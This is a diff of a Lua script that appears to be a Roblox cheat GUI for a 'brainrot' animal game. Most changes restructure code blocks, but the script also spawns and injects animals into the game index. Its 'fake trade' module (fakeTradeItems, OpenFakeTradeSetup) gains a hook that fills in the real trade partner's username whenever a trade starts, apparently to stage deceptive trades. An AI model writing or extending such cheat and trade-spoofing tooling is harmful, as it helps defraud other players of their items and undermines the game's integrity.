 Corner(mutGrid, 6)
-do
+;(function()
         local ul = Instance.new("UIListLayout", mutGrid);
         ul.Padding = UDim.new(0, 0)
         local up = Instance.new("UIPadding", mutGrid)
@@ -5901,7 +6042,7 @@ do
         up.PaddingRight = UDim.new(0, 4)
         up.PaddingTop = UDim.new(0, 4);
         up.PaddingBottom = UDim.new(0, 4)
-end
+end)()
 
 local mutBtns = {}
 for _, mut in ipairs(MUTATIONS) do
@@ -6011,7 +6152,7 @@ local function UpdateCount()
         end
 end
 
-do
+;(function()
         local SKIN_FILE = "NewBases.rbxmx"
         local SKIN_FILE_LEGACY = "BaseSkinsKing.rbxmx"
         local SKINS = {
@@ -6491,6 +6632,7 @@ do
                         end
                 end
         end
+        local SKIN_COLORS -- forward declaration
 
         function _syncBaseSkinToGameSettings(skinName)
                 if not skinName or skinName == "" then
@@ -7123,7 +7265,7 @@ do
                 watchPlot()
         end)
 
-        local SKIN_COLORS = {
+        SKIN_COLORS = {
                 Skibidi = {
                         main = Color3.fromRGB(255, 255, 255),
                         stroke = Color3.fromRGB(220, 220, 220)
@@ -7539,13 +7681,13 @@ do
                         end)
                 end)
         end
-end
+end)()
 
 
-local _pendingSpawns = {}
-local _slotOverride = nil
-local DoSpawn
-local function SpawnOneAnimal(animalName, mutation, traitsArr)
+_pendingSpawns = {}
+_slotOverride = nil
+DoSpawn = nil
+function SpawnOneAnimal(animalName, mutation, traitsArr)
         table.insert(_pendingSpawns, {
                 name = animalName,
                 mutation = mutation or "None",
@@ -7554,7 +7696,7 @@ local function SpawnOneAnimal(animalName, mutation, traitsArr)
         pcall(InjectToGameIndex, animalName, mutation or "None")
 end
 
-local function DrainPendingSpawns()
+function DrainPendingSpawns()
         if #_pendingSpawns == 0 then
                 return
         end
@@ -8285,7 +8427,7 @@ DoSpawn = function()
                                 return
                         end
                         local animalInfo = ANIMAL_DATA[selectedAnimal]
-                        local sellPrice = animalInfo and animalInfo.price or 0
+                        local sellPrice = GetAnimalPrice(selectedAnimal)
                         local function fmt(n)
                                 local function clean(s, suffix)
                                         return s:gsub("%.0+" .. suffix, suffix):gsub("(%.%d-)0+" .. suffix, "%1" .. suffix)
@@ -8648,7 +8790,7 @@ end)
 
 SetStatus("Ready — select an animal to spawn", SUBTEXT)
 
-do
+;(function()
         local function MakeMiscSection(title, layoutOrder, openByDefault)
                 local section = New("Frame", {
                         Size = UDim2.new(1, 0, 0, 0),
@@ -8704,6 +8846,35 @@ do
                 end)
                 return content
         end
+        -- Base shortcut button at the top of Misc (matches section header style)
+        do
+                local baseBtn = New("TextButton", {
+                        Size = UDim2.new(1, 0, 0, 32),
+                        BackgroundColor3 = Color3.fromRGB(28, 28, 38),
+                        BorderSizePixel = 0,
+                        AutoButtonColor = false,
+                        Text = "",
+                        LayoutOrder = 0,
+                        Parent = miscPage,
+                })
+                Corner(baseBtn, 6)
+                Stroke(baseBtn, Color3.fromRGB(60, 60, 80), 1, 0.2)
+                New("TextLabel", {
+                        Size = UDim2.new(1, -20, 1, 0),
+                        Position = UDim2.new(0, 10, 0, 0),
+                        BackgroundTransparency = 1,
+                        Text = "▶  Base",
+                        TextColor3 = Color3.fromRGB(230, 230, 240),
+                        Font = Enum.Font.GothamBold,
+                        TextSize = 13,
+                        TextXAlignment = Enum.TextXAlignment.Left,
+                        Parent = baseBtn,
+                })
+                baseBtn.Activated:Connect(function()
+                        SetTab("Base")
+                end)
+        end
+
         local cfgContent = MakeMiscSection("Configuration", 1, false)
         local keysContent = MakeMiscSection("Hotkeys", 2, false)
         local dataContent = MakeMiscSection("Spawned Brainrots", 3, false)
@@ -9599,9 +9770,9 @@ do
                         RefreshStatus()
                 end)
         end
-end
+end)()
 
-do
+;(function()
 
         local fakeTradeItems = {}
         local _activeFakeStartTimer = nil
@@ -11589,6 +11760,11 @@ do
                 })
                 Corner(usernameBox, 5)
                 Stroke(usernameBox, Color3.fromRGB(50, 45, 80), 1, 0.2)
+                _kvSetTradeUsername = function(name)
+                        if usernameBox and usernameBox.Parent then
+                                usernameBox.Text = name or ""
+                        end
+                end
                 if prefill and type(prefill.username) == "string" and prefill.username ~= "" then
                         usernameBox.Text = prefill.username
                 end
@@ -12405,7 +12581,7 @@ do
         end
 
         pcall(OpenFakeTradeSetup)
-end
+end)()
 
 if hideOnRejoinEnabled then
         pcall(function()
@@ -13619,6 +13795,11 @@ LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
                                                 username = partnerName,
                                                 items = items
                                         }
+                                        pcall(function()
+                                                if _kvSetTradeUsername then
+                                                        _kvSetTradeUsername(partnerName)
+                                                end
+                                        end)
                                 end
                         end)
                 end)
@@ -13879,3 +14060,5 @@ task.spawn(function()
                 end
         end
 end)
+end
+_buildUI()
